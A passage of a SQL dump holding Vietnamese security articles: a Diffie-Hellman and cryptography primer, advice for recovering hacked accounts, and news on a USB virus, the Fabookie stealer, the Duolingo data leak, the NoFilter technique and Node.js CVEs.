trao đổi an toàn các khóa dùng cho mã hóa dữ liệu.<br>\r\n    <br>\r\n    Trong hệ thống khóa đối xứng, hai bên truyền và nhận phải sử dụng khóa chung. Việc bảo mật cho hoạt động trao đổi khóa này luôn là một thách thức. Hoạt động này đã được tự động hóa và đảm bảo an toàn bởi thuật toán DH. Thuật toán này cho phép bên <i>sender</i> và <i>receiver</i> có thể tạo ra một <i>shared secret key</i> mà không cần phải trao đổi trước.<br>\r\n    <br>\r\n    DH thường được sử dụng khi trao đổi dữ liệu bằng IPsec VPN, SSL/TLS, hoặc SSH.<br><br>\r\n    <div>\r\n            <img src=\"Imageass/14899399453.14.png\">\r\n    </div><br>\r\n    Thuật toán DH có các bước xử lý như sau:<br>\r\n    <br>\r\n    <div>\r\n        <img src=\"Imageass/14899399453.15.png\">\r\n    </div><br>\r\n    <img src=\"Imageass/14899399453.16.png\"><br>\r\n    <i>( hết phần 3 )</i><br><br>\r\n    <b>Tham khảo:</b><br><br>\r\n    <ul>\r\n    <li data-xf-list-type=\"ul\"><i>CCNA Security curriculum</i></li>\r\n    </ul><i>(Nguồn: Blog “Học Ở Mọi Hình Thức” </i><a href=\"https://duchm72.wordpress.com/2015/08/06/cryptographic-systems-he-thong-mat-ma-part-3/\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fduchm72.wordpress.com%2F2015%2F08%2F06%2Fcryptographic-systems-he-thong-mat-ma-part-3%2F&amp;hash=12e5a8660624c687c34d7a8914ba55df\" rel=\"nofollow ugc noopener\">https://duchm72.wordpress.com/2015/08/06/cryptographic-systems-he-thong-mat-ma-part-3/</a><i><i>)</i></i>\r\n</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(50, 'Tổng quan về Cryptography', '', '<div class=\"entry-content post-content\">\r\n				\r\n    <div style=\"text-align: center\">\r\n        <span style=\"font-size: 14px\"> \r\n            <img src=\"Imageass/1489939936Dientap.png\">\r\n        </span>\r\n    ​</div>\r\n    <p> <span style=\"font-size: 14px\"><b>Cryptography là gì?</b></span></p>\r\n    <p> Thuật ngữ Cryptography đề cập tới một ngành khoa học nghiên cứu về mã hóa và giải mã thông tin; nghiên cứu các phương pháp, cách thức để chuyển đổi thông tin từ dạng “đọc-hiểu”(plaintext) sang dạng “đọc-nhưng-không-hiểu”(ciphertext) và ngược lại.<br> Là một ngành khoa học nghiên cứu, Cryptography thực sự khá phức tạp và khô khan tuy nhiên cũng không kém phần thú vị khi đưa vào áp dụng trong thực tế. Với loạt bài viết về chủ đề Cryptography, mình hy vọng phần nào sẽ đáp ứng được nhu cầu tìm hiểu của mọi người.</p>\r\n    <p> <b>Tại sao phải sử dụng Cryptography?</b><br> Trong thực tế, Cryptography được sử dụng rất rộng rãi – nhất là trong lĩnh vực công nghệ thông tin. Mục đích của việc sử dụng mã hóa – giải mã là để đảm bảo thông tin được truyền đi không bị đọc-hiểu một cách dễ dàng.<br> Khi chúng ta sử dụng mạng internet hàng ngày; các thông tin cá nhân, thông tin trao đổi với người khác, nội dung chat, tài khoản email, facebook v.v. là các dữ liệu được truyền đi trên mạng và không có gì đảm bảo những thông tin này là an toàn không bị đọc trộm. Do đó mã hóa được áp dụng như một biện pháp bắt buộc nhằm giúp chúng ta tự bảo vệ chính mình an toàn trên internet.</p>\r\n    <p> <b>Thuật toán mã hóa là gì?</b><br> Để mã hóa thông tin, Cryptography sử dụng các thuật toán để biến đổi thông tin dạng plain-text sang cipher-text và ngược lại.Áp dụng toán học và logic học, các thuật toán mã hóa được sử dụng có thể từ đơn giản đến cực kỳ phức tạp.<br> Ví dụ : Alice muốn mã hóa một thông tin với thuật toán ( * ) đơn giản là:<br> <i>Thay thế tất cả các chữ cái xuất hiện trong thông tin theo cách: </i><br> <i>“a” thành “h”; </i><br> <i>“h” thành “t”;</i><br> <i>“t” thành “a”;</i><br> Như vậy với thông điệp gốc là “<i>whitehat</i>” qua quá trình biến đổi sử dụng thuật toán ( * ) thông điệp sẽ trở thành “<i>wtiaetha</i>”. Để giải mã, đảo ngược lại thứ tự của thuật toán ( * ).<br> Alice nói với một người bạn tên Bob về thuật toán ( * ) và viết một bức thư áp dụng ( * ) để mã hóa. Như vậy bức thư mà Alice viết có thể nhờ Eve – một người bạn tò mò – giúp gửi cho Bob mà không lo ngại việc Eve có thể hiểu nội dung bức thư.<br> Khi nào mà tính bí mật của thuật toán ( * ) chỉ có Alice và Bob biết thì tính an toàn của nội dung bức thư còn được đảm bảo. Tuy nhiên cách thức này chỉ áp dụng trước đây do hiện nay, bằng sức mạnh tính toán và xử lý tốt của máy tính, tính bí mật của thuật toán hoàn toàn có thể bị khám phá ra dẫn đến việc có thể giải mã được thông tin gốc. Ở ví dụ trên, thuật toán ( * ) có thể bị Eve đoán ra bằng cách thử thay thế nhiều lần. Nếu như Eve phát hiện ra tính bí mật của thuật toán thì mức độ an toàn của nội dung thư mà Alice gửi đi đã bị phá vỡ hoàn toàn.</p>\r\n    <p> <b>Một số thuật ngữ sử dụng trong Cryptography</b><br> Mình sẽ tổng hợp dần dần theo từng bài viết về một số thuật ngữ cơ bản được sử dụng trong Cryptography giúp cho bạn đọc dễ tiếp cận và hình dung :<br> · <b>Sender/Receiver</b> : Người gửi và nhận dữ liệu – từ đây và các bài viết sau, mình sử dụng Alice và Bob là người gửi và nhận dữ liệu.<br> · <b>Attacker / Hacker </b>: Người tấn công hoặc vận chuyển thông tin trên đường truyền – Eve.<br> · <b>Plaintext:</b> Thông tin trước khi được mã hóa – dữ liệu ban đầu ở dạng có thể đọc-hiểu được.<br> · <b>Ciphertext:</b> Thông tin đã được mã hóa – dữ liệu ở dạng đọc-nhưng-không-hiểu được.<br> · <b>Encryption</b>: Quá trình mã hóa thông tin (Plaintext -&gt; Ciphertext).<br> · <b>Decryption:</b> Quá trình giải mã lấy lại thông tin ban đầu (Ciphertext -&gt; Plaintext).</p>\r\n    <p> <b>Tiếp theo</b><br> Trong các bài viết tiếp theo trong loạt bài về Cryptography, mình sẽ trình bày về lịch sử phát triển của Cryptography, các dạng mật mã cổ điển và áp dụng trong thực tế hiện nay.</p>\r\n    <p> <b>Ending is beginning</b><br> Rất mong nhận được sự góp ý của các bạn để hoàn thiện hơn nội dung cũng như chất lượng của bài viết.<br> Tản mạn :<br> · Định nghĩa về Cryptography trong Oxford Dict : “The art of writing or solving codes” J<br> · <i>Câu hỏi vui : Bạn cần phải kiểm tra xem anh bạn Bob đã có số điện thoại chính xác của bạn chưa, nhưng không thể hỏi trực tiếp anh ấy ( điện thoại của bạn hiện cũng hỏng không liên lạc được). Bạn phải viết câu hỏi ra một tờ giấy và đưa cho cô Eve để cô ấy chuyển cho Bob, và Eve sẽ chuyển câu trả lời từ Bob sang cho bạn. Bạn sẽ phải viết gì để đảm bảo rằng Bob có thể mã hóa thông tin mà Eve không thể biết được số điện thoại của bạn?</i> </p>\r\n    <div class=\"messageTextEndMarker\">&nbsp;</div>\r\n    \r\n</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(51, 'Phải làm gì khi tài khoản bị hack?', '', '<div class=\"message-content js-messageContent\">\r\n	<div class=\"message-userContent lbContainer js-lbContainer \" data-lb-id=\"post-42802\" data-lb-caption-desc=\"whf · 15/08/2023 lúc 11:49 PM\">\r\n		<article class=\"message-body js-selectToQuote\">\r\n				<div class=\"bbWrapper\"><b>Bạn đã từng cảm thấy điều bất thường khi truy cập tài khoản trực tuyến của mình? Nhưng làm thế nào để bạn biết chắc chắn tài khoản của bạn đã bị xâm nhập và bị hack? Hãy cùng nhau khám phá những dấu hiệu nhận biết và những biện pháp cần thực hiện khi phát hiện tài khoản bị xâm phạm qua bài viết sau.</b><br>\r\n<h3><b>Dấu hiệu nhận biết tài khoản của bạn bị hack</b>​</h3><ul>\r\n<li data-xf-list-type=\"ul\">Không thể đăng nhập tài khoản dù bạn đã nhập đúng tên người dùng và mật khẩu</li>\r\n<li data-xf-list-type=\"ul\">Cài đặt bảo mật cho tài khoản bị thay đổi (số điện thoại/email...)</li>\r\n<li data-xf-list-type=\"ul\">Có email thông báo tài khoản của bạn đăng nhập ở thiết bị lạ, thời điểm không bình thường</li>\r\n<li data-xf-list-type=\"ul\">Có giao dịch chuyển tiền hoặc mua hàng từ tài khoản trực tuyến của bạn dù bạn không thực hiện</li>\r\n</ul><h3><div style=\"text-align: center\">\r\n		<img src=\"Imageass/Anh-whitehat-vn.png\">\r\n</div></h3><h3><b>Những việc cần thực hiện nếu tài khoản của bạn đã bị hack</b>​</h3><h4><b>1. Liên hệ với nhà cung cấp dịch vụ</b>​</h4>Truy cập trang web của nhà cung cấp dịch vụ và tìm kiếm các trang trợ giúp hoặc hỗ trợ của họ. Tại đây sẽ có những hướng dẫn chi tiết quá trình khôi phục tài khoản (có thể khác nhau đối với từng tài khoản). Nếu bạn không thể tìm thấy hướng dẫn, hãy cố gắng liên hệ với số hotline hoặc chat / email cho đội ngũ hỗ trợ.<br>\r\n<h4><b>2. Kiểm tra tài khoản email của bạn</b>​</h4>Kiểm tra bộ lọc email và quy tắc chuyển tiếp. Một chiến thuật phổ biến được bọn tội phạm mạng sử dụng là thiết lập quy tắc chuyển tiếp, có nghĩa là chúng sẽ tự động nhận được một bản sao của tất cả các email được gửi đến tài khoản của bạn (điều này sẽ cho phép chúng đặt lại mật khẩu của bạn). Bạn có thể tìm thấy hướng dẫn chi tiết về cách thực hiện việc này trên trang web của nhà cung cấp dịch vụ email hoặc bạn có thể sử dụng công cụ tìm kiếm.<br>\r\n<h4><b>3. Thay đổi mật khẩu</b>​</h4>Sau khi kiểm tra không có quy tắc chuyển tiếp email không mong muốn nào, bạn cần phải:<br>\r\n<ul>\r\n<li data-xf-list-type=\"ul\">Thay đổi mật khẩu cho bất kỳ tài khoản nào đã bị hack</li>\r\n<li data-xf-list-type=\"ul\">Thay đổi mật khẩu cho bất kỳ tài khoản nào đang sử dụng cùng một mật khẩu với tài khoản đã bị hack</li>\r\n</ul>Cả hai bước đều quan trọng vì tội phạm mạng biết rằng nhiều người sử dụng cùng một mật khẩu cho các tài khoản khác nhau và do đó sẽ thử cùng một mật khẩu đã hack được trên nhiều tài khoản.<br>\r\n<h4><b>4. Đăng xuất khỏi tất cả thiết bị</b>​</h4>Khi bạn đã thay đổi mật khẩu của mình, bạn cần đảm bảo đăng xuất tài khoản khỏi mọi thiết bị và xóa khỏi các ứng dụng được liên kết. Điều này thường có thể được thực hiện từ menu Cài đặt của ứng dụng hoặc trang web (hoặc nó có thể là một phần của tùy chọn Quyền riêng tư hoặc Tài khoản). Để biết hướng dẫn cụ thể về cách thực hiện việc này, bạn cần tham khảo trang hỗ trợ cho dịch vụ liên quan. Khi bạn đã hoàn thành việc này, bất kỳ ai khác cố gắng sử dụng tài khoản của bạn sẽ được nhắc cung cấp mật khẩu mới.<br>\r\n<h4><b>5. Thiết lập xác minh 2 bước</b>​</h4>Nhiều tài khoản và dịch vụ trực tuyến cho phép bạn thiết lập xác minh hai bước, có nghĩa là ngay cả khi tội phạm biết mật khẩu của bạn, chúng cũng không thể truy cập vào tài khoản của bạn. Xác minh 2 bước thường hoạt động bằng cách gửi cho bạn mã bí mật qua SMS / email hoặc dùng trình tạo mã, sau đó bạn sẽ phải nhập mã này để chứng minh rằng đó thực sự là bạn. Bạn nên dành thời gian để thiết lập xác minh 2 bước trên các tài khoản quan trọng như email và ngân hàng, ngay cả khi những tài khoản này đã được bảo vệ bằng mật khẩu mạnh. Chỉ mất vài phút và kết quả là bạn sẽ an toàn hơn khi trực tuyến.<br>\r\n<h4><b>6. Cập nhật thiết bị của bạn</b>​</h4>Bạn nên cập nhật các bản vá cho ứng dụng và phần mềm của thiết bị ngay khi chúng có sẵn. Các bản cập nhật thường bao gồm các cải tiến và tính năng mới ngoài ra cũng vá các lỗ hổng có thể bị khai thác. Áp dụng những cập nhật này là một trong những điều quan trọng nhất (và nhanh nhất) bạn có thể làm để ngăn tài khoản của mình bị tấn công. Bạn cũng nên bật \"cập nhật tự động\" trong cài đặt của thiết bị/phần mềm nếu có. Điều này có nghĩa là bạn không cần phải cập nhật thủ công. Lưu ý rằng việc cập nhật thiết bị của bạn có thể mất một chút thời gian và yêu cầu kết nối internet an toàn.<br>\r\n<h4><b>7. Thông báo cho bạn bè, người thân, đồng nghiệp</b>​</h4>Đừng ngại mọi người sẽ biết bạn bị hack, hãy thể hiện mình là người có trách nhiệm bằng cách thông báo càng sớm càng tốt cho người thân, bạn bè, đồng nghiệp biết khi phát hiện tài khoản của bạn bị hack để họ có thể cảnh giác trước các tin nhắn / email gửi được đi từ tài khoản bị hack của bạn.<br>\r\n<h4><b>8. Kiểm tra bảng sao kê ngân hàng và tài khoản mua sắm trực tuyến của bạn</b>​</h4>Hãy kiểm tra các giao dịch trái phép từ tài khoản mua sắm trực tuyến hoặc kiểm tra tài khoản ngân hàng của bạn xem có bất kỳ giao dịch bất thường nào không. Bạn có thể liên hệ trực tiếp với ngân hàng của mình để được hỗ trợ thêm.<br>\r\n<h4><b>9. Liên hệ cơ quan chức năng</b>​</h4>Khi phát hiện bị hack tài khoản, bị mất tiền, hãy nhanh chóng báo với ngân hàng đồng thời liên hệ cơ quan chức năng gần nhất đễ được hỗ trợ. Điều này sẽ giúp cơ quan thực thi pháp luật giảm thiểu hoạt động tội phạm và cũng giúp ngăn chặn những người khác trở thành nạn nhân.<br>\r\n<h3><b>Phải làm gì nếu bạn không thể khôi phục tài khoản của mình?</b>​</h3>Trong một số trường hợp, bạn không thể khôi phục được tài khoản đã bị hack. Trong những trường hợp như vậy, bạn sẽ phải tạo một tài khoản mới nếu muốn tiếp tục sử dụng dịch vụ. Khi đó bạn hãy thông báo để người thân, bạn bè. đồng nghiệp biết về việc bạn không còn dùng tài khoản cũ và sử dụng tài khoản mới. Ngoài ra nếu tài khoản bị hack không thể khôi phục là email thì hãy đảm bảo bạn cập nhật email mới cho tài khoản ngân hàng trực tuyến, cũng như các tài khoản có liên kết với email cũ.</div>\r\n			<div class=\"js-selectToQuoteEnd\">&nbsp;</div>\r\n		</article>\r\n	</div>\r\n		<div class=\"message-lastEdit\">\r\n			\r\n				Chỉnh sửa lần cuối: <time class=\"u-dt\" dir=\"auto\" datetime=\"2023-09-07T09:07:00+0700\" data-time=\"1694052420\" data-date-string=\"07/09/2023\" data-time-string=\"9:07 AM\" title=\"07/09/2023 lúc 9:07 AM\" itemprop=\"dateModified\">07/09/2023</time>\r\n				\r\n		</div>\r\n    </div>', '', 'admin', 0, '2024-06-29 06:25:21');
INSERT INTO `contentmembers` (`id`, `title`, `url`, `content`, `image`, `author`, `view_count`, `reg_date`) VALUES
(52, 'Cảnh báo: Virus có khả năng ‘tái sinh’ đang lây lan nhanh', '', '<div class=\"bbWrapper\"><b>Một loại virus lợi dụng tiến trình chuẩn svchost.exe trên máy tính để ăn sâu vào hệ thống và “tái sinh”, có dấu hiệu tăng cao tại Việt Nam. Hệ thống giám sát và cảnh báo mã độc của Bkav ghi nhận có gần 96.000 máy bị nhiễm loại virus này, chỉ tính riêng trong tháng 8.</b><br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/Virusloidungsvchost.jpg\">\r\n    </div><br>\r\n    Cho dù người dùng phát hiện và đã xóa tệp tin độc hại theo cách thủ công, virus này vẫn có thể “tái sinh” nhờ vào việc lợi dụng tiến trình svchost.exe trong hệ thống. Không chỉ lợi dụng svchost.exe, virus này còn tìm kiếm những phần mềm mặc định đi kèm với các phiên bản Windows như OneDrive hay Notepad, để thực hiện hành vi tương tự. Điều này gây khó khăn trong việc xử lý hay gỡ bỏ triệt để chúng.<br>\r\n    <br>\r\n    Nguy hiểm hơn, không chỉ khó gỡ bỏ, virus này còn có cơ chế lây lan qua USB bằng cách ẩn đi các dữ liệu có trong USB, thay vào đó là các shortcut giả mạo dữ liệu. Các shortcut này chứa lệnh gọi tới virus đang bị ẩn trong USB. Nếu người dùng mở các shortcut giả mạo này, virus sẽ được thực thi. Cuối cùng, sau khi thâm nhập và tồn tại được trên máy tính của nạn nhân, virus vô hiệu hóa các biện pháp bảo vệ sẵn có của Windows và đợi thời cơ tải xuống tệp tin độc hại khác, nhằm đánh cắp thông tin của người dùng và gửi dữ liệu về máy chủ của kẻ tấn công.<br>\r\n    <br>\r\n    Để tránh bị tấn công bởi mã độc này, các chuyên gia Bkav khuyến cáo:<br>\r\n    <ul>\r\n    <li data-xf-list-type=\"ul\">Nâng cao cảnh giác khi sử dụng các thiết bị ngoại vi để sao chép dữ liệu giữa các máy tính. Các doanh nghiệp, tổ chức có thể đưa ra chính sách không sử dụng USB trong doanh nghiệp, tổ chức của mình, nếu cần thiết.</li>\r\n    <li data-xf-list-type=\"ul\">Luôn bật chế độ hiện file ẩn và kiểm tra shortcut trong USB trước khi click vào. Việc giả mạo shortcut trong USB cũng được rất nhiều dòng virus khác sử dụng.</li>\r\n    <li data-xf-list-type=\"ul\">Sử dụng và cập nhật thường xuyên các giải pháp, phần mềm an ninh mạng có bản quyền để bảo vệ máy tính và hệ thống khỏi những mối nguy hại khó phát hiện hoặc đòi hỏi xử lý phức tạp mới gỡ bỏ được triệt để virus.</li>\r\n    </ul><br>\r\n    <div style=\"text-align: right\"><b><i>Theo Bkav</i></b>​</div>\r\n</div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(53, 'Mã độc đánh cắp tài khoản Facebook hoành hành mạnh tại Việt Nam', '', '<div class=\"bbWrapper\"><b>Hệ thống giám sát và cảnh báo mã độc của Bkav ghi nhận số lượng máy tính nhiễm mã độc Fabookie chuyên đánh cắp tài khoản Facebook Bussiness đang có dấu hiệu tăng cao. Trong tháng 7, tại Việt Nam có tới hơn 100.000 máy bị nhiễm mã độc này.</b><br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/Fa.png\">\r\n    </div><br>\r\n    Fabookie thực hiện việc đánh cắp thông qua Cookies và mật khẩu được lưu trong trình duyệt, tương tự các mẫu mã độc đánh cắp tài khoản khác. Đối với đa số trang web, nếu hacker có được phiên đăng nhập cùng với mật khẩu là có thể thực hiện đổi mật khẩu, từ đó chiếm quyền kiểm soát hoàn toàn tài khoản nạn nhân.<br>\r\n    <br>\r\n    Điều đáng nói, Fabookie còn được “thiết kế” đặc biệt để tấn công các tài khoản Facebook Bussiness. Mã độc này sẽ kiểm tra Cookie đã giải mã, xem tài khoản có đang được đăng nhập hay không, sau đó sử dụng Facebook Graph API Queries (một phương thức truy vấn dữ liệu từ Facebook) để truy vấn thêm các thông tin về tài khoản, phương thức thanh toán, số dư... của tài khoản nạn nhân. Nếu khối dữ liệu khai thác thành công và thông tin đánh cắp được là từ tài khoản Facebook Business, hacker có thể sử dụng chính tài khoản nạn nhân để âm thầm chạy quảng cáo thay vì ngay lập tức đổi mật khẩu và chiếm tài khoản.<br>\r\n    <br>\r\n    Điều này sẽ giúp hacker đạt được nhiều mục đích khác như kiếm thêm lợi nhuận, sử dụng để SEO (nâng cao thứ hạng website trên các công cụ tìm kiếm) các trang web phát tán mã độc... hơn là chiếm đoạt luôn tài khoản, sẽ gây báo động tới người quản trị và bị ngắt kết nối thẻ tín dụng.<br>\r\n    <br>\r\n    Theo xu hướng của các mã độc thế hệ mới, Fabookie chỉ nhắm vào các máy chạy hệ điều hành 64-bit. Để tránh việc bị tấn công bởi mã độc Fabookie, các chuyên gia khuyến cáo:<br>\r\n    <ul>\r\n    <li data-xf-list-type=\"ul\">Không cài đặt và sử dụng các phần mềm crack, keygen…</li>\r\n    <li data-xf-list-type=\"ul\">Hạn chế sử dụng chức năng lưu mật khẩu trên trình duyệt với các tài khoản quan trọng.</li>\r\n    <li data-xf-list-type=\"ul\">Sử dụng phần mềm diệt virus, giải pháp an ninh mạng để đảm bảo an toàn cho máy cá nhân cũng như hệ thống trong các cơ quan, tổ chức, doanh nghiệp.</li>\r\n    </ul><div style=\"text-align: right\"><b><i>Theo Bkav</i></b>​</div></div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(54, 'Dữ liệu cá nhân của 2,6 triệu người dùng Duolingo bị phát tán trên diễn đàn hacker', '', '<div class=\"bbWrapper\"><b>Dữ liệu cá nhân của 2,6 triệu người dùng Duolingo đã bị rò rỉ trên một diễn đàn hacker, cho phép tin tặc thực hiện các cuộc tấn công lừa đảo có chủ đích bằng cách sử dụng thông tin bị lộ.</b><br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/15487-55378f0e8003c9fcb2dd98437529c1b2.png\">\r\n        </div><br>\r\n    Duolingo là một trong những trang web học ngôn ngữ lớn nhất thế giới, với hơn 74 triệu người dùng hàng tháng. Vào tháng 1 năm 2023, tin tặc đã bán dữ liệu thu thập được của 2,6 triệu người dùng Duolingo trên diễn đàn B*****ed (đã ngừng hoạt động) với giá 1.500 đô la.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/15489-49bed578a3ca6d40895ae27f0143232b.png\">\r\n    </div><br>\r\n    Dữ liệu này bao gồm thông tin đăng nhập, tên thật và những thông tin không công khai như địa chỉ email hay thông tin nội bộ liên quan đến dịch vụ Duolingo. Mặc dù tên thật và tên đăng nhập đã được công khai trong hồ sơ Duolingo của người dùng, các chuyên gia vẫn lo ngại về mức độ nguy hiểm của vụ rò rỉ do địa chỉ email bị lộ lọt có thể bị hacker sử dụng trong các cuộc tấn công.<br>\r\n    <br>\r\n    Khi dữ liệu được rao bán, Duolingo xác nhận rằng chúng được lấy từ thông tin hồ sơ công khai và họ đang điều tra xem có nên thực hiện các biện pháp phòng ngừa bổ sung hay không. Tuy nhiên, hãng không đề cập đến việc địa chỉ email cũng được liệt kê trong dữ liệu bị rò rỉ, dù đây không phải là thông tin công khai.<br>\r\n    <br>\r\n    Mới đây, bộ dữ liệu của 2,6 triệu người dùng DuoLingo đã một lần nữa được rao bán trên một phiên bản mới của diễn đàn hack B*****ed, với giá gần như miễn phí là 2,13 đô la.<br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/15488-80e0b9c765e3802a4f74438c8879390b.png\">\r\n    </div><br>\r\n    Dữ liệu bị thu thập bằng cách sử dụng giao diện lập trình ứng dụng (API) bị lộ lọt và đã được chia sẻ công khai ít nhất là từ tháng 3 năm 2023. API này cho phép nhập tên người dùng vào và nhận lại đầu ra là các thông tin công khai của họ ở dạng JSON. Tuy nhiên, bạn cũng có thể nhập địa chỉ email vào API để truy ngược xem địa chỉ đó có được liên kết với tài khoản Duolingo hợp lệ.<br>\r\n    <br>\r\n    Hacker có thể sử dụng các công cụ thu thập email để nhập hàng triệu địa chỉ thư điện tử (đã bị lộ trong các vụ vi phạm dữ liệu trước đó) vào API và xác nhận xem chúng có thuộc tài khoản Duolingo hay không. Những địa chỉ email này sau đó được sử dụng để tạo tập dữ liệu chứa thông tin công khai và không công khai của nạn nhân.<br>\r\n    <br>\r\n    Hiện API này vẫn còn hoạt động, ngay cả sau khi việc tin tặc lạm dụng nó được báo cáo cho Duolingo vào tháng 1. Duolingo hiện vẫn im lặng trước vấn đề này.<br>\r\n    <br>\r\n    <div style=\"text-align: right\"><b>Nguồn: </b><a href=\"https://www.bleepingcomputer.com/news/security/scraped-data-of-26-million-duolingo-users-released-on-hacking-forum/\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fwww.bleepingcomputer.com%2Fnews%2Fsecurity%2Fscraped-data-of-26-million-duolingo-users-released-on-hacking-forum%2F&amp;hash=eed120adcad67f77cb0e45683ccd1066\" rel=\"noopener\"><b><i>Bleeping Computer</i></b></a>​</div></div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(55, 'Tấn công NoFilter cho phép leo thang đặc quyền trên Windows mà không bị phát hiện', '', '<div class=\"bbWrapper\"><b>Một kỹ thuật tấn công mới vừa được phát hiện có tên NoFilter, lạm dụng nền tảng Windows Filtering Platform (WFP) để leo thang đặc quyền trên hệ điều hành Windows.</b><br>\r\n    <br>\r\n    <div style=\"text-align: center\">\r\n        <img src=\"Imageass/Nofilter.jpg\">\r\n    </div><br>\r\n    Phát hiện này được các chuyên gia đến từ Công ty Deep Instinct trình bày tại Hội thảo an ninh DEFCON vừa kết thúc tại Mỹ.<br>\r\n    <br>\r\n    WFP là một bộ các dịch vụ API và hệ thống được sử dụng để xử lý lưu lượng mạng và cho phép cấu hình các bộ lọc để cấp phép hoặc chặn các giao tiếp.<br>\r\n    <br>\r\n    Với kỹ thuật tấn công mới này, tin tặc khi đã xâm nhập được vào máy nạn nhân sẽ tiến hành cài đặt một file độc hại có tên NoFilter.exe để nâng từ quyền admin lên SYSTEM (hệ thống).<br>\r\n    <br>\r\n    Nói cách khác, NoFilter có thể khởi chạy bảng điều khiển mới với tư cách là \"NT AUTHORITYSYSTEM\" hoặc một người dùng khác khi đã truy cập được vào thiết bị.<br>\r\n    <br>\r\n    Kỹ thuật nói ở trên có thể bị chỉnh sửa để thực hiện nhân bản trong nhân qua WFP, khiến nó vừa lẩn tránh, vừa tàng hình và hầu như không để lại bất kỳ bằng chứng hay nhật ký nào. Người dùng có thể tham khảo phân tích chi tiết về kỹ thuật này tại <a href=\"https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Ron%20Ben-Yizhak%20-%20NoFilter%20Abusing%20Windows%20Filtering%20Platform%20for%20privilege%20escalation.pdf\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fmedia.defcon.org%2FDEF%2520CON%252031%2FDEF%2520CON%252031%2520presentations%2FRon%2520Ben-Yizhak%2520-%2520NoFilter%2520Abusing%2520Windows%2520Filtering%2520Platform%2520for%2520privilege%2520escalation.pdf&amp;hash=93a28eb4842cbb2b1cf4b978ed068f24\" rel=\"noopener\">đây</a>.<br>\r\n    <br>\r\n    Cần lưu ý là kỹ thuật NoFilter có thể lạm dụng các thành phần được tích hợp sẵn trong hệ điều hành như WFP nhưng tránh WinAPI được giám sát bởi các sản phẩm an ninh.<br>\r\n    <br>\r\n    <div style=\"text-align: right\"><b><i>Theo <a href=\"https://thehackernews.com/2023/08/nofilter-attack-sneaky-privilege.html\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fthehackernews.com%2F2023%2F08%2Fnofilter-attack-sneaky-privilege.html&amp;hash=11738a58a096f144091bbbf69e893880\" rel=\"noopener\">The Hacker News</a></i></b>​</div></div>', '', 'admin', 0, '2024-06-29 06:25:21'),
(56, 'Phát hiện nhiều lỗ hổng nghiêm trọng tồn tại trong Node.js', '', '<div class=\"bbWrapper\"><b>Node.js là một nền tảng độc lập được xây dựng trên môi trường JavaScript runtime phổ biến cho các ứng dụng như máy chủ web, ứng dụng trò chuyện theo thời gian thực và các ứng dụng doanh nghiệp.</b><br>\r\n    <br>\r\n    <div style=\"text-align: center\"><b>\r\n            <img src=\"Imageass/Node.js.png\">\r\n    </b>​</div><br>\r\n    Tuy nhiên, nhiều lỗ hổng nghiêm trọng vừa được tìm thấy trong Node.js cho phép kẻ tấn công giành quyền truy cập vào hệ thống, thực thi mã tùy ý và đánh cắp thông tin nhạy cảm.<br>\r\n    <br>\r\n    Tổng cộng có tất cả 7 lỗ hổng được phát hiện, đều cho phép kẻ tấn công từ xa vượt qua được các hạn chế bảo mật.<br>\r\n    <br>\r\n    <i>Các lỗ hổng bao gồm:</i><br>\r\n    <ul>\r\n    <li data-xf-list-type=\"ul\">CVE-2023-32002, CVE-2023-32006<b>:</b> kẻ tấn công lợi dụng một số hàm để qua mặt được cơ chế chính sách phân quyền.</li>\r\n    <li data-xf-list-type=\"ul\">CVE-2023-32559: kẻ tấn công sử dụng API đã cũ để vượt qua cơ chế bảo mật.</li>\r\n    </ul>Cả ba lỗ hổng đều ảnh hưởng đến các phiên bản 16.x, 18.x và 20.x<br>\r\n    <ul>\r\n    <li data-xf-list-type=\"ul\">4 lỗ hổng còn lại là CVE-2023-32003, CVE-2023-32004, CVE-2023-32005, CVE-2023-32558 ảnh hưởng đến phiên bản Node.js 20.</li>\r\n    </ul>Các lỗ hổng có tác động đáng kể đến các doanh nghiệp sử dụng Node.js như các tổ chức tài chính, chăm sóc sức khỏe và cơ quan chính phủ.<br>\r\n    <br>\r\n    7 Lỗ hổng đã được vá trong Node.js phiên bản 20.5.1, 18.17.1 và 16.20.2. Các tổ chức cần cập nhật lên phiên bản mới nhất ngay lập tức để tránh bị tấn công.<br>\r\n    <br>\r\n    Ngoài ra, các doanh nghiệp nên áp dụng các biên phép an ninh bổ sung để đảm bảo an toàn:<br>\r\n    <ul>\r\n    <li data-xf-list-type=\"ul\">Sử dụng tường lửa để hạn chế truy cập máy chủ Node.js</li>\r\n    <li data-xf-list-type=\"ul\">Sử dụng tưởng lửa ứng dụng web (WAF) để bảo vệ máy chủ Node.js</li>\r\n    <li data-xf-list-type=\"ul\">Luôn cập nhật bản vá mới nhất của Node.js</li>\r\n    </ul><div style=\"text-align: right\"><b><i>Theo </i></b><a href=\"https://securityonline.info/multiple-critical-security-vulnerabilities-found-in-node-js/\" target=\"_blank\" class=\"link link--external\" data-proxy-href=\"/proxy.php?link=https%3A%2F%2Fsecurityonline.info%2Fmultiple-critical-security-vulnerabilities-found-in-node-js%2F&amp;hash=fe20c71a2a5f10bf10ae1388fa82a857\" rel=\"noopener\"><i><b>Security Online</b></i></a>​</div></div>', '', 'admin', 0, '2024-06-29 06:25:21'),
